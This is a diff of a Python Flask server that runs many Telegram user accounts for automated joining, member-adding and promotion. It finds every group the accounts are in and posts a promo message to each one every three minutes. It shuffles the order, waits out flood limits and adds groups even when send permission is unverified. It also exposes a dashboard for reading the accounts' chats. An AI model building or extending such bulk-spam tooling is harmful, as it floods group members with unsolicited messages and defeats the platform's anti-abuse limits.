@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-Telegram Auto-Add Server - WITH FIXED AUTO SHARE SYSTEM
+Telegram Auto-Add Server - WITH AUTO SHARE SYSTEM
+Optimized Dashboard - Chat list only, history on demand
 Features: Auto Join, Auto Add Members, Auto Share Promo Message
 """
 
@@ -85,6 +86,11 @@ PROMO_MESSAGE = """🔥🔥🔥🔥🔥🔥🔥🔥
 
 SHARE_INTERVAL_SECONDS = 180  # 3 minutes = 180 seconds
 SHARE_DELAY_BETWEEN_GROUPS = 20  # 20 seconds delay between each group
+AUTO_SHARE_ENABLED = True
+
+# Groups to share the promo message to
+# These should be groups where your accounts are members
+SHARE_GROUPS = []  # Will be populated from recent chats/contacts
 
 CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
 SERVER_NAME = CFG['name']
@@ -125,12 +131,12 @@ share_stats = {
 file_lock = threading.Lock()
 worker_lock = threading.Lock()
 
-# Chat cache for dashboard
+# Chat cache for dashboard (LIGHTWEIGHT - only chat list, no message history)
 chat_list_cache = {}
 message_cache = {}
 cache_lock = threading.Lock()
-CHAT_LIST_CACHE_DURATION = 15
-MESSAGE_CACHE_DURATION = 30
+CHAT_LIST_CACHE_DURATION = 15  # 15 seconds for chat list
+MESSAGE_CACHE_DURATION = 30    # 30 seconds for messages
 
 stats = {
     'total_added': 0,
@@ -243,14 +249,12 @@ def save_share_groups():
 
 def load_share_groups():
     global share_groups
-    loaded = load_json(SHARE_GROUPS_FILE, [])
+    share_groups = load_json(SHARE_GROUPS_FILE, [])
     # Always include target groups
     for tg in TARGET_GROUPS:
-        if tg not in loaded:
-            loaded.append(tg)
-    share_groups = loaded
+        if tg not in share_groups:
+            share_groups.append(tg)
     save_share_groups()
-    logger.info(f"📋 Loaded {len(share_groups)} share groups")
 
 # ============================================
 # TELEGRAM CLIENT HELPER
@@ -397,12 +401,7 @@ def remove_dead_account(aid, reason=""):
                     except:
                         pass
             if str(aid) in running_share_tasks:
-                share_info = running_share_tasks.pop(str(aid), None)
-                if share_info and share_info.get('worker'):
-                    try:
-                        share_info['worker'].stop()
-                    except:
-                        pass
+                running_share_tasks.pop(str(aid), None)
             worker_adds.pop(str(aid), None)
         save_json(ACCOUNTS_FILE, accounts)
         save_json(SETTINGS_FILE, auto_add_settings)
@@ -436,70 +435,60 @@ def send_telegram(text, retries=3):
     return False
 
 # ============================================
-# GROUP DISCOVERY - Get all groups from account
+# GROUP DISCOVERY - Get all groups from contacts and recent chats
 # ============================================
-def discover_groups_from_account(account):
-    """Discover all groups the account can share to"""
-    discovered = set()
+def discover_share_groups(account):
+    """Discover groups suitable for sharing from the account's chats and contacts"""
+    discovered_groups = set()
     
     async def _discover():
+        nonlocal discovered_groups
         client = SyncTelegramClient.get_client(account['session'])
         try:
-            await client.connect()
+            if not await SyncTelegramClient.safe_connect(client):
+                return list(discovered_groups)
             if not await client.is_user_authorized():
-                return list(discovered)
+                return list(discovered_groups)
             
-            logger.info(f"🔍 Discovering groups for {account.get('name', 'unknown')}...")
-            
-            # Get all dialogs
+            # Get all dialogs (recent chats)
             dialogs = await client.get_dialogs(limit=200)
             
             for dialog in dialogs:
                 try:
+                    # Only get groups and channels (not users or bots)
                     if dialog.is_group or dialog.is_channel:
                         entity = dialog.entity
-                        
-                        # Skip if it's a megagroup/channel where we might not have permissions
                         group_id = None
-                        group_title = dialog.name or 'Unknown'
                         
+                        # Get group username or ID
                         if hasattr(entity, 'username') and entity.username:
                             group_id = entity.username
                         elif hasattr(entity, 'id'):
                             group_id = str(entity.id)
                         
-                        if not group_id:
-                            continue
-                        
-                        # Try to check if we can send messages
-                        try:
-                            participant = await client.get_permissions(entity, 'me')
-                            if participant and participant.send_messages:
-                                discovered.add(group_id)
-                                logger.info(f"  ✅ Found: {group_title} ({group_id})")
-                            else:
-                                logger.info(f"  ⚠️ Cannot send to: {group_title}")
-                        except errors.ChatAdminRequiredError:
-                            # Even without admin, try adding - we might be able to send
-                            discovered.add(group_id)
-                            logger.info(f"  ➕ Added (no permission check): {group_title}")
-                        except Exception as e:
-                            # Add anyway, will filter during sending
-                            discovered.add(group_id)
-                            logger.info(f"  ➕ Added (error checking): {group_title}")
+                        if group_id:
+                            # Check if we can send messages to this group
+                            try:
+                                # Verify we have send permissions
+                                participant = await client.get_permissions(entity, 'me')
+                                if participant and participant.send_messages:
+                                    discovered_groups.add(group_id)
+                                    logger.info(f"📢 Discovered share group: {entity.title or group_id}")
+                            except:
+                                # Even if we can't verify permissions, add it
+                                # We'll handle errors during actual sharing
+                                discovered_groups.add(group_id)
                 except:
                     continue
             
             # Also add target groups
             for tg in TARGET_GROUPS:
-                discovered.add(tg)
+                discovered_groups.add(tg)
             
-            logger.info(f"📊 Discovered {len(discovered)} groups total")
-            return list(discovered)
-            
+            return list(discovered_groups)
         except Exception as e:
-            logger.error(f"Discover error: {e}")
-            return list(discovered)
+            logger.error(f"Discover groups error: {e}")
+            return list(discovered_groups)
         finally:
             try:
                 await client.disconnect()
@@ -507,13 +496,12 @@ def discover_groups_from_account(account):
                 pass
     
     try:
-        return SyncTelegramClient.run_async(_discover, timeout=60)
-    except Exception as e:
-        logger.error(f"Discover sync error: {e}")
-        return list(discovered)
+        return SyncTelegramClient.run_async(_discover, timeout=45)
+    except:
+        return list(discovered_groups)
 
 # ============================================
-# AUTO SHARE WORKER - SIMPLIFIED AND ROBUST
+# AUTO SHARE WORKER
 # ============================================
 class AutoShareWorker:
     def __init__(self, account):
@@ -525,60 +513,12 @@ class AutoShareWorker:
         self.last_share_time = 0
         self.consecutive_errors = 0
         self.max_consecutive_errors = 10
-        self.my_groups = []  # Groups this specific account will share to
+        self.share_groups_list = []
         self._loop = None
-        self.refresh_counter = 0
     
     def stop(self):
         self.running = False
-    
-    def run(self):
-        self._loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(self._loop)
-        
-        logger.info(f"📢 Share worker STARTED for {self.account.get('name', self.acc_id)}")
-        
-        # Initial group discovery
-        self.refresh_groups()
-        
-        while self.running:
-            try:
-                # Refresh groups every 30 minutes
-                self.refresh_counter += 1
-                if self.refresh_counter % 30 == 0 or len(self.my_groups) == 0:
-                    self.refresh_groups()
-                
-                # Check if it's time to share
-                current_time = time.time()
-                if current_time - self.last_share_time < SHARE_INTERVAL_SECONDS:
-                    time.sleep(5)
-                    continue
-                
-                if not self.my_groups:
-                    logger.warning(f"📢 No groups to share for {self.account.get('name')}")
-                    self.refresh_groups()
-                    time.sleep(30)
-                    continue
-                
-                logger.info(f"📢 Starting share cycle for {self.account.get('name')} - {len(self.my_groups)} groups")
-                
-                # Share to all groups
-                success = self.share_to_all_groups()
-                
-                self.last_share_time = time.time()
-                logger.info(f"📢 Share cycle completed: {success} groups")
-                
-            except Exception as e:
-                logger.error(f"Share worker error: {e}")
-                time.sleep(30)
-        
         self.disconnect_client()
-        logger.info(f"📢 Share worker STOPPED for {self.account.get('name', self.acc_id)}")
-        try:
-            if self._loop and not self._loop.is_closed():
-                self._loop.close()
-        except:
-            pass
     
     def disconnect_client(self):
         if self.client:
@@ -589,141 +529,237 @@ class AutoShareWorker:
                             await self.client.disconnect()
                         except:
                             pass
-                    self._loop.run_until_complete(asyncio.wait_for(_disconnect(), timeout=5))
+                    try:
+                        self._loop.run_until_complete(asyncio.wait_for(_disconnect(), timeout=5))
+                    except:
+                        pass
             except:
                 pass
-            self.client = None
+            finally:
+                self.client = None
     
-    def refresh_groups(self):
-        """Refresh the groups list from global share_groups and discovery"""
-        global share_groups
+    def run(self):
+        self._loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(self._loop)
         
-        # Use global share_groups
-        self.my_groups = list(share_groups)
+        logger.info(f"📢 Auto-share worker started for {self.account.get('name', self.acc_id)}")
         
-        # Also discover from this account
+        # Discover groups for sharing
+        self.refresh_share_groups()
+        
+        while self.running:
+            try:
+                # Wait for the interval
+                current_time = time.time()
+                time_since_last_share = current_time - self.last_share_time
+                
+                if time_since_last_share < SHARE_INTERVAL_SECONDS:
+                    wait_time = SHARE_INTERVAL_SECONDS - time_since_last_share
+                    # Sleep in small chunks to check running flag
+                    for _ in range(int(wait_time)):
+                        if not self.running:
+                            break
+                        time.sleep(1)
+                    continue
+                
+                # Refresh groups list periodically
+                if len(self.share_groups_list) == 0 or random.random() < 0.1:  # 10% chance to refresh
+                    self.refresh_share_groups()
+                
+                if not self.share_groups_list:
+                    logger.warning(f"Share worker {self.acc_key}: No groups to share to, refreshing...")
+                    self.refresh_share_groups()
+                    time.sleep(30)
+                    continue
+                
+                # Share to all groups
+                if self.ensure_connection():
+                    self.share_to_all_groups()
+                    self.last_share_time = time.time()
+                else:
+                    self.consecutive_errors += 1
+                    if self.consecutive_errors >= self.max_consecutive_errors:
+                        logger.error(f"Share worker {self.acc_key}: Too many connection failures")
+                        break
+                    time.sleep(30)
+                
+            except Exception as e:
+                logger.error(f"Share worker {self.acc_key} cycle error: {e}")
+                self.consecutive_errors += 1
+                if self.consecutive_errors >= self.max_consecutive_errors:
+                    break
+                time.sleep(30)
+        
+        logger.info(f"Share worker {self.acc_key} stopped")
         try:
-            discovered = discover_groups_from_account(self.account)
-            for g in discovered:
-                if g not in self.my_groups:
-                    self.my_groups.append(g)
-                if g not in share_groups:
-                    share_groups.append(g)
-            save_share_groups()
+            if self._loop and not self._loop.is_closed():
+                self._loop.close()
         except:
             pass
-        
-        logger.info(f"📢 Refreshed: {len(self.my_groups)} groups for sharing")
+    
+    def refresh_share_groups(self):
+        """Refresh the list of groups to share to"""
+        try:
+            # Use global share_groups if available
+            global share_groups
+            if share_groups:
+                self.share_groups_list = list(share_groups)
+            else:
+                # Discover from account
+                discovered = discover_share_groups(self.account)
+                self.share_groups_list = discovered
+                # Update global list
+                for g in discovered:
+                    if g not in share_groups:
+                        share_groups.append(g)
+                save_share_groups()
+            
+            logger.info(f"📢 Share worker {self.acc_key}: {len(self.share_groups_list)} groups to share to")
+        except Exception as e:
+            logger.error(f"Refresh share groups error: {e}")
+    
+    def ensure_connection(self):
+        try:
+            if self.client and hasattr(self.client, 'is_connected'):
+                try:
+                    if self.client.is_connected():
+                        async def ping():
+                            try:
+                                await self.client.get_me()
+                                return True
+                            except:
+                                return False
+                        if SyncTelegramClient.run_async(ping, timeout=10):
+                            return True
+                        else:
+                            return self.reconnect()
+                except:
+                    pass
+            return self.connect_client()
+        except:
+            return self.reconnect()
+    
+    def connect_client(self):
+        for attempt in range(3):
+            try:
+                self.disconnect_client()
+                time.sleep(1)
+                self.client = SyncTelegramClient.get_client(self.account['session'])
+                async def _connect():
+                    if not await SyncTelegramClient.safe_connect(self.client):
+                        return False
+                    return await self.client.is_user_authorized()
+                result = SyncTelegramClient.run_async(_connect, timeout=20)
+                if result:
+                    return True
+            except Exception as e:
+                logger.error(f"Share connect error (attempt {attempt + 1}): {e}")
+            if attempt < 2:
+                time.sleep(min(5 * (attempt + 1), 15))
+        return False
+    
+    def reconnect(self):
+        self.disconnect_client()
+        time.sleep(3)
+        return self.connect_client()
     
     def share_to_all_groups(self):
-        """Share promo message to all groups with delay"""
-        groups = list(self.my_groups)
-        random.shuffle(groups)
+        """Share the promo message to all groups with 20 second delay between each"""
+        groups = list(self.share_groups_list)
+        random.shuffle(groups)  # Randomize order
         
         success_count = 0
+        fail_count = 0
         
-        for i, group_id in enumerate(groups):
+        for group_id in groups:
             if not self.running:
                 break
             
             try:
-                if self.send_message_to_group(group_id, PROMO_MESSAGE):
+                if self.share_to_group(group_id):
                     success_count += 1
                     share_stats['total_shares'] = share_stats.get('total_shares', 0) + 1
                     share_stats['today_shares'] = share_stats.get('today_shares', 0) + 1
                     share_stats['last_share_time'] = datetime.now().isoformat()
-                    logger.info(f"  ✅ Shared to: {group_id}")
                 else:
-                    logger.info(f"  ❌ Failed: {group_id}")
+                    fail_count += 1
+                
+                # 20 second delay between each group
+                if group_id != groups[-1]:  # Don't delay after last group
+                    logger.info(f"⏳ Waiting {SHARE_DELAY_BETWEEN_GROUPS}s before next share...")
+                    for _ in range(SHARE_DELAY_BETWEEN_GROUPS):
+                        if not self.running:
+                            break
+                        time.sleep(1)
+                        
             except Exception as e:
-                logger.error(f"  ❌ Error sharing to {group_id}: {e}")
-            
-            # Delay between groups (except after last one)
-            if i < len(groups) - 1:
-                for _ in range(SHARE_DELAY_BETWEEN_GROUPS):
-                    if not self.running:
-                        break
-                    time.sleep(1)
+                logger.error(f"Share to {group_id} error: {e}")
+                fail_count += 1
         
-        # Save stats
+        logger.info(f"📢 Share cycle complete: {success_count} success, {fail_count} failed")
+        
         if success_count > 0:
-            save_json(STATS_FILE, stats)
-            logger.info(f"📊 Share stats: {success_count} shared, total today: {share_stats['today_shares']}")
-        
-        return success_count
-    
-    def send_message_to_group(self, group_id, message):
-        """Send a message to a specific group"""
-        async def _send():
-            client = None
             try:
-                client = SyncTelegramClient.get_client(self.account['session'])
-                await client.connect()
-                
-                if not await client.is_user_authorized():
-                    logger.error(f"Not authorized for {self.account.get('name')}")
-                    return False
-                
+                send_telegram(
+                    f"<b>{SERVER_NAME}</b> - Share Report\n"
+                    f"Account: {self.account.get('name', self.acc_id)}\n"
+                    f"✅ Shared to: {success_count} groups\n"
+                    f"❌ Failed: {fail_count}\n"
+                    f"📊 Today total: {share_stats.get('today_shares', 0)}"
+                )
+            except:
+                pass
+    
+    def share_to_group(self, group_id):
+        """Share promo message to a specific group"""
+        if not self.ensure_connection():
+            return False
+        
+        async def _share():
+            try:
                 # Get entity
                 entity = None
                 try:
-                    if group_id.startswith('-100') or group_id.startswith('-'):
-                        entity = await client.get_entity(int(group_id))
-                    elif group_id.replace('_', '').replace('.', '').isalpha():
-                        entity = await client.get_entity(group_id)
+                    if group_id.startswith('-'):
+                        entity = await self.client.get_entity(int(group_id))
                     else:
-                        try:
-                            entity = await client.get_entity(int(group_id))
-                        except:
-                            entity = await client.get_entity(group_id)
-                except Exception as e:
-                    logger.error(f"Cannot find entity for {group_id}: {e}")
-                    return False
+                        entity = await self.client.get_entity(group_id)
+                except:
+                    try:
+                        entity = await self.client.get_entity(int(group_id))
+                    except:
+                        return False
                 
-                # Send the message
-                await client.send_message(entity, message)
-                logger.info(f"✅ Message sent to {group_id}")
+                # Send the promo message
+                await self.client.send_message(entity, PROMO_MESSAGE)
+                logger.info(f"✅ Shared to: {getattr(entity, 'title', group_id)}")
                 return True
                 
             except errors.FloodWaitError as e:
-                logger.warning(f"Flood wait for {group_id}: {e.seconds}s")
-                time.sleep(min(e.seconds, 120))
+                logger.warning(f"Flood wait {e.seconds}s for {group_id}")
+                time.sleep(min(e.seconds, 60))
                 return False
             except errors.ChatWriteForbiddenError:
-                logger.warning(f"Cannot write to {group_id} - removing")
-                self.remove_group(group_id)
-                return False
-            except errors.ChannelPrivateError:
-                logger.warning(f"Channel private: {group_id} - removing")
-                self.remove_group(group_id)
+                logger.warning(f"Cannot write to {group_id} - removing from list")
+                # Remove from share groups
+                if group_id in self.share_groups_list:
+                    self.share_groups_list.remove(group_id)
+                global share_groups
+                if group_id in share_groups:
+                    share_groups.remove(group_id)
+                    save_share_groups()
                 return False
             except Exception as e:
-                logger.error(f"Send error for {group_id}: {type(e).__name__}: {e}")
+                logger.error(f"Share to {group_id} error: {e}")
                 return False
-            finally:
-                if client:
-                    try:
-                        await client.disconnect()
-                    except:
-                        pass
         
         try:
-            return SyncTelegramClient.run_async(_send, timeout=30)
-        except Exception as e:
-            logger.error(f"Send sync error: {e}")
+            return SyncTelegramClient.run_async(_share, timeout=20)
+        except:
             return False
-    
-    def remove_group(self, group_id):
-        """Remove a problematic group"""
-        if group_id in self.my_groups:
-            self.my_groups.remove(group_id)
-        global share_groups
-        if group_id in share_groups:
-            share_groups.remove(group_id)
-            save_share_groups()
 
 # ============================================
-# AUTO-ADD WORKER (KEEP EXISTING)
+# AUTO-ADD WORKER
 # ============================================
 class AutoAddWorker:
     def __init__(self, account):
@@ -1088,13 +1124,11 @@ def start_auto_share(account):
     acc_key = str(account['id'])
     with worker_lock:
         try:
-            # Stop existing share worker if running
             if acc_key in running_share_tasks:
                 existing = running_share_tasks[acc_key]
                 if existing and existing.get('thread') and existing['thread'].is_alive():
                     existing['worker'].stop()
                     existing['thread'].join(timeout=5)
-                    logger.info(f"Stopped existing share worker for {acc_key}")
             
             worker = AutoShareWorker(account)
             thread = threading.Thread(target=worker.run, daemon=True, name=f"share_{acc_key}")
@@ -1118,7 +1152,7 @@ def stop_auto_share(account_id):
             logger.error(f"Stop share worker error: {e}")
 
 # ============================================
-# PHONE LOOKUP HELPERS (Keep existing)
+# PHONE LOOKUP HELPERS
 # ============================================
 def find_phone_for_user(telegram_id):
     tid = str(telegram_id)
@@ -1186,7 +1220,7 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
     return result
 
 # ============================================
-# DASHBOARD HELPERS (Keep existing)
+# DASHBOARD HELPERS (LIGHTWEIGHT)
 # ============================================
 def get_account_by_id(account_id):
     for acc in accounts:
@@ -1205,19 +1239,30 @@ def get_client_for_account(account_id):
         return None, str(e)
 
 async def get_dialogs_lightweight(client, limit=50):
+    """
+    Get ONLY chat list with last message preview - NO full message history.
+    This is fast and lightweight.
+    """
     dialogs_list = []
+    
     try:
         dialogs = await client.get_dialogs(limit=limit)
+        
         for dialog in dialogs:
             try:
                 entity = dialog.entity
+                
+                # Determine chat type and ID
                 if hasattr(entity, 'username') and entity.username:
                     chat_id = entity.username
                 elif hasattr(entity, 'id'):
                     chat_id = str(entity.id)
                 else:
                     continue
+                
                 title = dialog.name or 'Unknown'
+                
+                # Determine type
                 if dialog.is_user:
                     chat_type = 'bot' if getattr(entity, 'bot', False) else 'user'
                 elif dialog.is_group:
@@ -1226,9 +1271,12 @@ async def get_dialogs_lightweight(client, limit=50):
                     chat_type = 'channel'
                 else:
                     chat_type = 'user'
+                
+                # Get last message info ONLY (no history fetch)
                 last_message_text = ''
                 last_message_date = None
                 last_message_media = None
+                
                 if dialog.message:
                     msg = dialog.message
                     if msg.message:
@@ -1240,6 +1288,7 @@ async def get_dialogs_lightweight(client, limit=50):
                             last_message_media = 'photo'
                         elif hasattr(msg.media, 'document'):
                             last_message_media = 'document'
+                
                 chat_data = {
                     'id': chat_id,
                     'title': title,
@@ -1252,18 +1301,27 @@ async def get_dialogs_lightweight(client, limit=50):
                     'isGroup': dialog.is_group,
                     'isChannel': dialog.is_channel
                 }
+                
                 dialogs_list.append(chat_data)
-            except:
+            except Exception as e:
                 continue
+        
+        # Sort: unread first, then by date
         dialogs_list.sort(key=lambda x: (-x.get('unread', 0), -(x.get('lastMessageDate') or 0)))
         return dialogs_list
+        
     except Exception as e:
         logger.error(f"Get dialogs error: {e}")
         raise
 
 async def get_chat_messages(client, chat_id, limit=30):
+    """
+    Get messages for a SPECIFIC chat - called only when user clicks a chat.
+    """
     messages_list = []
+    
     try:
+        # Get entity
         entity = None
         try:
             if chat_id.startswith('-'):
@@ -1275,7 +1333,10 @@ async def get_chat_messages(client, chat_id, limit=30):
                 entity = await client.get_entity(int(chat_id))
             except:
                 return messages_list
+        
+        # Get messages
         messages = await client.get_messages(entity, limit=limit)
+        
         for msg in messages:
             if not msg:
                 continue
@@ -1289,6 +1350,7 @@ async def get_chat_messages(client, chat_id, limit=30):
                     'hasMedia': bool(msg.media),
                     'mediaType': None
                 }
+                
                 if msg.media:
                     if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
                         msg_data['mediaType'] = 'photo'
@@ -1304,9 +1366,11 @@ async def get_chat_messages(client, chat_id, limit=30):
                                 msg_data['mediaType'] = 'document'
                     elif isinstance(msg.media, MessageMediaWebPage):
                         msg_data['mediaType'] = 'link'
+                
                 messages_list.append(msg_data)
             except:
                 continue
+        
         return messages_list
     except Exception as e:
         logger.error(f"Get messages error: {e}")
@@ -1325,8 +1389,14 @@ async def send_message_async(client, chat_id, message_text):
                 entity = await client.get_entity(int(chat_id))
             except:
                 raise ValueError(f"Cannot find chat: {chat_id}")
+        
         result = await client.send_message(entity, message_text)
-        return {'success': True, 'messageId': result.id, 'text': result.message, 'date': int(result.date.timestamp()) if result.date else 0}
+        return {
+            'success': True,
+            'messageId': result.id,
+            'text': result.message,
+            'date': int(result.date.timestamp()) if result.date else 0
+        }
     except Exception as e:
         logger.error(f"Send message error: {e}")
         raise
@@ -1349,7 +1419,11 @@ async def download_media_async(client, account_id, message_id):
                             os.remove(filepath)
                         except:
                             pass
-                        return {'data': base64.b64encode(data).decode('utf-8'), 'mime_type': mime_type, 'size': len(data)}
+                        return {
+                            'data': base64.b64encode(data).decode('utf-8'),
+                            'mime_type': mime_type,
+                            'size': len(data)
+                        }
             except:
                 continue
         return None
@@ -1410,8 +1484,7 @@ def ping():
         'share_workers': len(running_share_tasks),
         'accounts': len(accounts),
         'total_added_today': stats.get('today_added', 0),
-        'total_shares_today': share_stats.get('today_shares', 0),
-        'share_groups': len(share_groups)
+        'total_shares_today': share_stats.get('today_shares', 0)
     })
 
 @app.route('/api/server-info')
@@ -1423,9 +1496,7 @@ def server_info():
             'name': SERVER_NAME,
             'url': SERVER_URL,
             'target_groups': TARGET_GROUPS,
-            'share_groups_count': len(share_groups),
-            'share_interval': f"{SHARE_INTERVAL_SECONDS}s ({SHARE_INTERVAL_SECONDS//60} min)",
-            'share_delay': f"{SHARE_DELAY_BETWEEN_GROUPS}s"
+            'share_groups_count': len(share_groups)
         }
     })
 
@@ -1456,225 +1527,281 @@ def get_accounts():
     return jsonify({'success': True, 'accounts': acc_list})
 
 # ============================================
-# SHARE API ROUTES
+# AUTO SHARE API ROUTES
 # ============================================
+
 @app.route('/api/share-groups', methods=['GET'])
 def get_share_groups():
+    """Get list of groups for auto sharing"""
     return jsonify({
         'success': True,
         'groups': share_groups,
         'count': len(share_groups)
     })
 
-@app.route('/api/share-groups/add', methods=['POST'])
-def add_share_groups():
+@app.route('/api/share-groups', methods=['POST'])
+def update_share_groups():
+    """Add groups to share list"""
     try:
         data = request.json or {}
         new_groups = data.get('groups', [])
+        
         if not new_groups:
             return jsonify({'success': False, 'error': 'No groups provided'})
+        
         added = 0
         for group in new_groups:
             group = str(group).strip()
             if group and group not in share_groups:
                 share_groups.append(group)
                 added += 1
+        
         save_share_groups()
-        return jsonify({'success': True, 'message': f'Added {added} groups', 'total': len(share_groups)})
+        
+        return jsonify({
+            'success': True,
+            'message': f'Added {added} groups',
+            'total_groups': len(share_groups)
+        })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/share-groups/remove', methods=['POST'])
 def remove_share_group():
+    """Remove a group from share list"""
     try:
         data = request.json or {}
         group = data.get('group', '').strip()
+        
         if not group:
             return jsonify({'success': False, 'error': 'Group not specified'})
+        
         if group in share_groups:
             share_groups.remove(group)
             save_share_groups()
-        return jsonify({'success': True, 'message': f'Removed: {group}', 'total': len(share_groups)})
+        
+        return jsonify({
+            'success': True,
+            'message': f'Removed group: {group}',
+            'total_groups': len(share_groups)
+        })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/share-groups/discover', methods=['POST'])
-def discover_groups_route():
+def discover_groups():
+    """Discover groups for sharing from an account"""
     try:
         data = request.json or {}
         account_id = data.get('accountId', '')
+        
         if not account_id:
             return jsonify({'success': False, 'error': 'Account ID required'})
+        
         acc = get_account_by_id(account_id)
         if not acc:
             return jsonify({'success': False, 'error': 'Account not found'})
         
-        discovered = discover_groups_from_account(acc)
+        discovered = discover_share_groups(acc)
+        
+        # Add to global list
         added = 0
         for g in discovered:
             if g not in share_groups:
                 share_groups.append(g)
                 added += 1
         save_share_groups()
+        
         return jsonify({
             'success': True,
             'discovered': len(discovered),
             'new_added': added,
-            'total': len(share_groups),
-            'all_groups': discovered
+            'total_groups': len(share_groups)
         })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/auto-share/start', methods=['POST'])
-def start_share_route():
+def start_share():
+    """Start auto share for an account"""
     try:
         data = request.json or {}
         account_id = data.get('accountId', '')
+        
         if not account_id:
             return jsonify({'success': False, 'error': 'Account ID required'})
+        
         acc = get_account_by_id(account_id)
         if not acc:
             return jsonify({'success': False, 'error': 'Account not found'})
+        
         start_auto_share(acc)
-        return jsonify({'success': True, 'message': f'Share started for {acc.get("name", account_id)}'})
+        
+        return jsonify({
+            'success': True,
+            'message': f'Auto share started for {acc.get("name", account_id)}'
+        })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/auto-share/stop', methods=['POST'])
-def stop_share_route():
+def stop_share():
+    """Stop auto share for an account"""
     try:
         data = request.json or {}
         account_id = data.get('accountId', '')
+        
         if not account_id:
             return jsonify({'success': False, 'error': 'Account ID required'})
+        
         stop_auto_share(account_id)
-        return jsonify({'success': True, 'message': f'Share stopped for {account_id}'})
+        
+        return jsonify({
+            'success': True,
+            'message': f'Auto share stopped for account {account_id}'
+        })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/auto-share/start-all', methods=['POST'])
-def start_share_all_route():
+def start_share_all():
+    """Start auto share for all accounts"""
     try:
         started = 0
         for acc in accounts:
-            if acc.get('session') and check_account_auth(acc):
-                start_auto_share(acc)
-                started += 1
-                time.sleep(2)
-        return jsonify({'success': True, 'message': f'Started {started} share workers', 'started': started})
+            if acc.get('session'):
+                if check_account_auth(acc):
+                    start_auto_share(acc)
+                    started += 1
+                    time.sleep(2)  # Stagger starts
+        
+        return jsonify({
+            'success': True,
+            'message': f'Auto share started for {started} accounts',
+            'started': started
+        })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/auto-share/stop-all', methods=['POST'])
-def stop_share_all_route():
+def stop_share_all():
+    """Stop auto share for all accounts"""
     try:
         stopped = 0
         for acc_key in list(running_share_tasks.keys()):
             stop_auto_share(acc_key)
             stopped += 1
-        return jsonify({'success': True, 'message': f'Stopped {stopped} share workers', 'stopped': stopped})
+        
+        return jsonify({
+            'success': True,
+            'message': f'Auto share stopped for {stopped} accounts',
+            'stopped': stopped
+        })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/share-stats')
-def get_share_stats_route():
+def get_share_stats():
+    """Get auto share statistics"""
     return jsonify({
         'success': True,
         'stats': {
             'total_shares': share_stats.get('total_shares', 0),
             'today_shares': share_stats.get('today_shares', 0),
             'last_share_time': share_stats.get('last_share_time'),
+            'errors': share_stats.get('errors', 0),
             'active_share_workers': len(running_share_tasks),
             'total_share_groups': len(share_groups),
             'share_interval': SHARE_INTERVAL_SECONDS,
-            'delay_between_groups': SHARE_DELAY_BETWEEN_GROUPS,
-            'promo_message': PROMO_MESSAGE
+            'delay_between_groups': SHARE_DELAY_BETWEEN_GROUPS
         }
     })
 
 @app.route('/api/promo-message', methods=['GET', 'POST'])
-def promo_message_route():
+def promo_message():
+    """Get or update the promo message"""
     global PROMO_MESSAGE
+    
     if request.method == 'GET':
-        return jsonify({'success': True, 'message': PROMO_MESSAGE})
+        return jsonify({
+            'success': True,
+            'message': PROMO_MESSAGE,
+            'share_interval': SHARE_INTERVAL_SECONDS,
+            'delay_between_groups': SHARE_DELAY_BETWEEN_GROUPS
+        })
+    
+    # POST - Update message
     try:
         data = request.json or {}
         new_message = data.get('message', '')
+        
         if new_message:
             PROMO_MESSAGE = new_message
             logger.info(f"📢 Promo message updated")
-        return jsonify({'success': True, 'message': PROMO_MESSAGE})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/test-share', methods=['POST'])
-def test_share():
-    """Test share to a specific group immediately"""
-    try:
-        data = request.json or {}
-        account_id = data.get('accountId', '')
-        group_id = data.get('groupId', '')
-        message = data.get('message', PROMO_MESSAGE)
-        
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
-        if not group_id:
-            return jsonify({'success': False, 'error': 'Group ID required'})
-        
-        acc = get_account_by_id(account_id)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        # Create temporary worker just for this test
-        worker = AutoShareWorker(acc)
-        success = worker.send_message_to_group(group_id, message)
-        worker.disconnect_client()
         
         return jsonify({
-            'success': success,
-            'message': 'Test share sent' if success else 'Test share failed',
-            'group': group_id
+            'success': True,
+            'message': PROMO_MESSAGE
         })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 # ============================================
-# DASHBOARD ROUTES (Keep existing)
+# DASHBOARD - GET CHAT LIST ONLY (FAST)
 # ============================================
 @app.route('/api/get-chats', methods=['POST'])
 def get_chats():
+    """
+    Get ONLY chat list with last message preview.
+    NO message history - fast and lightweight.
+    """
     try:
         data = request.json or {}
         account_id = data.get('accountId', '')
+        
         if not account_id:
             return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        # Check cache
         cache_key = f"chats_{account_id}"
         with cache_lock:
             if cache_key in chat_list_cache:
                 cached = chat_list_cache[cache_key]
                 if time.time() - cached.get('timestamp', 0) < CHAT_LIST_CACHE_DURATION:
                     return jsonify(cached['data'])
+        
         client, acc = get_client_for_account(account_id)
         if not client:
             return jsonify({'success': False, 'error': acc})
+        
         async def _get():
             if not await SyncTelegramClient.safe_connect(client):
                 return None, "Failed to connect"
             if not await client.is_user_authorized():
                 return None, "auth_key_unregistered"
             dialogs = await get_dialogs_lightweight(client, limit=50)
-            return {'success': True, 'chats': dialogs, 'accountName': acc.get('name', 'Unknown')}, None
+            return {
+                'success': True,
+                'chats': dialogs,
+                'accountName': acc.get('name', 'Unknown')
+            }, None
+        
         try:
             result, error = SyncTelegramClient.run_async(_get, timeout=25)
+            
             if error:
                 return jsonify({'success': False, 'error': error})
+            
             if result:
                 with cache_lock:
